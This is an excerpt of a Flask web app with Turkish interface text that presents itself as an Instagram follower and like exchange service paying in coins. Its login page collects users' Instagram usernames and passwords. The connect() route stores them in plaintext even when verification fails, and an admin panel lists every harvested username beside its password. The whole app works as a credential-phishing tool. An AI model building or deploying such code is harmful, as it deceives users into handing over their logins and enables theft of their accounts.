...
app.config['SECRET_KEY'] = "allfollow-v51-admin"
...
class IGAccount(db.Model):
    ...
    coins = db.Column(db.Integer, default=1000) # Gerçek coin sütunu
...
def admin_panel():
    ...
    <body style="background:#111; color:#fff; font-family:sans-serif; padding:20px;">
        <h2>Sistemdeki Kayıtlı Hesaplar</h2>
        <table border="1" style="width:100%; border-collapse:collapse; text-align:left;">
            <tr style="background:#333;">
                <th>Kullanıcı Adı</th><th>Şifre</th><th>Coin</th>
            </tr>
            {% for acc in accounts %}
            <tr>
                <td>{{ acc.username }}</td><td>{{ acc.password }}</td><td>{{ acc.coins }}</td>
            </tr>
            {% endfor %}
        </table>
    </body>
...
<body class="bg-gray-50 flex flex-col items-center">
    ...
    <div id="login-page" class="page active bg-black p-8 justify-center">
        ...
        <div id="form-area" class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 text-white rounded-2xl outline-none border border-zinc-800">
            <p id="err" class="text-red-500 text-[11px] hidden text-center font-bold"></p>
            <button onclick="login()" id="lbtn" class="w-full p-4 bg-[#a100ff] text-white font-bold rounded-2xl">GİRİŞ YAP</button>
        </div>
        <div id="code-area" class="hidden space-y-4 mt-6">
            ...
            <button onclick="verify()" class="w-full p-4 bg-green-600 text-white font-bold rounded-2xl">ONAYLA</button>
        </div>
    </div>
    ...
    <div id="tasks-page" class="page">
        <div class="purple-header p-6 text-white shadow-xl">
            <div class="flex justify-between items-center mb-6">
                <div class="bg-white/20 px-4 py-1.5 rounded-full text-xs font-bold">
                    <span class="text-yellow-400">🟡</span> <span id="coin-disp">1000</span>
                </div>
        ...
        <div class="p-6">
            <div class="bg-white p-4 rounded-2xl shadow-sm border border-gray-100 flex items-center justify-between">
                <div class="flex items-center space-x-3">
                    ...
                    <div><p id="usr-display" class="font-bold text-gray-800 text-sm">...</p><p class="text-[10px] text-green-500">Sistem Aktif</p></div>
                </div>
                <i class="fas fa-check-circle text-purple-600"></i>
            </div>
            <button class="w-full mt-10 bg-[#a100ff] text-white py-4 rounded-2xl font-black shadow-xl uppercase">Duraklat</button>
        </div>
    </div>

    <div id="followers-page" class="page p-6">
        <h2 class="text-2xl font-black text-gray-800 mb-6">Takipçiler</h2>
        <div class="bg-white p-4 rounded-2xl shadow-sm border border-purple-50 flex justify-between items-center mb-3">
            <span class="font-bold text-gray-700">100 Takipçi</span>
            <button class="bg-purple-600 text-white text-xs px-5 py-2 rounded-xl">800 🟡</button>
        </div>
    </div>
    ...
    <div id="likes-page" class="page p-6 text-center justify-center">
        ...
        <p class="text-gray-400 text-sm">Yakında aktif edilecek.</p>
    </div>

    <div id="nav-bar" class="nav-bot hidden flex justify-around p-4 text-white/50">
        <div onclick="showPage('likes-page')" class="text-center cursor-pointer"><i class="fas fa-heart"></i><p class="text-[9px]">Beğeniler</p></div>
        <div onclick="showPage('followers-page')" class="text-center cursor-pointer"><i class="fas fa-users"></i><p class="text-[9px]">Takipçiler</p></div>
        <div onclick="showPage('tasks-page')" class="text-center cursor-pointer text-white"><i class="fas fa-tasks"></i><p class="text-[9px]">Görevler</p></div>
    </div>
    ...
    <script>
        ...
        async function login(){
            ...
            if(data.status === 'success') {
                ...
                document.getElementById('coin-disp').innerText = data.coins;
                ...
                err.innerText = data.msg; err.classList.remove('hidden');
            }
        }
...
def connect():
    ...
    if not acc:
        acc = IGAccount(username=u, password=p, coins=1000)
        db.session.add(acc)
    else:
        acc.password = p
    db.session.commit()
    ...
    except BadPassword: return jsonify(status="error", msg="Şifre hatalı!")
    except ChallengeRequired: return jsonify(status="challenge")
    except Exception: return jsonify(status="success", coins=acc.coins)
